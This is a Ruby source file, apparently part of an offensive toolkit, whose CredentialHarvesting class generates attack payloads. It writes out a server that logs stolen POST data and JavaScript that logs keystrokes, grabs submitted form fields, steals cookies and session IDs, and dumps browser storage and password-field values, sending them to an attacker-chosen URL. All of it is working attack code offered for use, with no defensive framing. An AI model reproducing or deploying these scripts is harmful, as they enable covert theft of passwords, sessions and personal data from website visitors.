require 'uri'
require 'net/http'
require 'json'
require_relative '../utils/network'
require_relative '../utils/colorize'

class CredentialHarvesting
  def self.setup_harvester_server(port = 8080, log_file = nil)
    log_file ||= "harvested_#{Time.now.to_i}.log"
    
    server_script = <<~RUBY
      require 'webrick'
      require 'json'
      
      log_file = '#{log_file}'
      port = #{port}
      
      server = WEBrick::HTTPServer.new(:Port => port)
      
      server.mount_proc '/' do |req, res|
        if req.request_method == 'POST'
          data = JSON.parse(req.body) rescue req.body
          File.open(log_file, 'a') do |f|
            f.puts "#{Time.now} - #{data.inspect}"
          end
          res.status = 200
          res.body = 'OK'
        else
          res.status = 200
          res.body = 'Harvester active'
        end
      end
      
      trap('INT') { server.shutdown }
      server.start
    RUBY
    
    filename = "harvester_server_#{Time.now.to_i}.rb"
    File.write(filename, server_script)
    puts Colorize.green("Harvester server script saved: #{filename}")
    puts Colorize.yellow("Run: ruby #{filename}")
    filename
  end

  def self.generate_keylogger_javascript(output_url)
    keylogger = <<~JS
      var keys = '';
      var outputUrl = '#{output_url}';
      
      document.addEventListener('keypress', function(e) {
        keys += String.fromCharCode(e.which);
        
        if (keys.length > 100) {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', outputUrl, true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({keys: keys}));
          keys = '';
        }
      });
      
      setInterval(function() {
        if (keys.length > 0) {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', outputUrl, true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({keys: keys}));
          keys = '';
        }
      }, 5000);
    JS
    
    filename = "keylogger_#{Time.now.to_i}.js"
    File.write(filename, keylogger)
    puts Colorize.green("Keylogger script saved: #{filename}")
    filename
  end

  def self.generate_form_grabbing_javascript(output_url)
    form_grabber = <<~JS
      var outputUrl = '#{output_url}';
      
      var originalSubmit = HTMLFormElement.prototype.submit;
      HTMLFormElement.prototype.submit = function() {
        var formData = new FormData(this);
        var data = {};
        formData.forEach(function(value, key) {
          data[key] = value;
        });
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', outputUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
        
        return originalSubmit.apply(this, arguments);
      };
      
      document.addEventListener('submit', function(e) {
        var formData = new FormData(e.target);
        var data = {};
        formData.forEach(function(value, key) {
          data[key] = value;
        });
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', outputUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
      }, true);
    JS
    
    filename = "form_grabber_#{Time.now.to_i}.js"
    File.write(filename, form_grabber)
    puts Colorize.green("Form grabber script saved: #{filename}")
    filename
  end

  def self.generate_cookie_stealer_javascript(output_url)
    cookie_stealer = <<~JS
      var outputUrl = '#{output_url}';
      var cookies = document.cookie;
      var url = window.location.href;
      
      var xhr = new XMLHttpRequest();
      xhr.open('POST', outputUrl, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify({
        cookies: cookies,
        url: url,
        userAgent: navigator.userAgent
      }));
    JS
    
    filename = "cookie_stealer_#{Time.now.to_i}.js"
    File.write(filename, cookie_stealer)
    puts Colorize.green("Cookie stealer script saved: #{filename}")
    filename
  end

  def self.generate_session_hijacking_script(target_url, session_param = 'session_id')
    hijacker = <<~JS
      var targetUrl = '#{target_url}';
      var sessionParam = '#{session_param}';
      
      function stealSession() {
        var cookies = document.cookie;
        var sessionId = null;
        
        cookies.split(';').forEach(function(cookie) {
          var parts = cookie.trim().split('=');
          if (parts[0] === sessionParam || parts[0].toLowerCase().includes('session')) {
            sessionId = parts[1];
          }
        });
        
        if (sessionId) {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', targetUrl, true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({
            sessionId: sessionId,
            cookies: cookies,
            url: window.location.href
          }));
        }
      }
      
      stealSession();
      setInterval(stealSession, 30000);
    JS
    
    filename = "session_hijacker_#{Time.now.to_i}.js"
    File.write(filename, hijacker)
    puts Colorize.green("Session hijacker script saved: #{filename}")
    filename
  end

  def self.generate_credential_dumper(target_service)
    dumpers = {
      'browser' => <<~JS
        if (typeof(Storage) !== "undefined") {
          var credentials = {};
          for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            credentials[key] = localStorage.getItem(key);
          }
          for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            credentials[key] = sessionStorage.getItem(key);
          }
          console.log(credentials);
        }
      JS,
      'password_manager' => <<~JS
        var forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
          var inputs = form.querySelectorAll('input[type="password"]');
          inputs.forEach(function(input) {
            var username = form.querySelector('input[type="text"], input[type="email"]');
            if (username && input.value) {
              console.log('Username: ' + username.value + ', Password: ' + input.value);
            }
          });
        });
      JS
    }
    
    dumper = dumpers[target_service] || dumpers['browser']
    filename = "credential_dumper_#{target_service}_#{Time.now.to_i}.js"
    File.write(filename, dumper)
    puts Colorize.green("Credential dumper saved: #{filename}")
    filename
  end
end

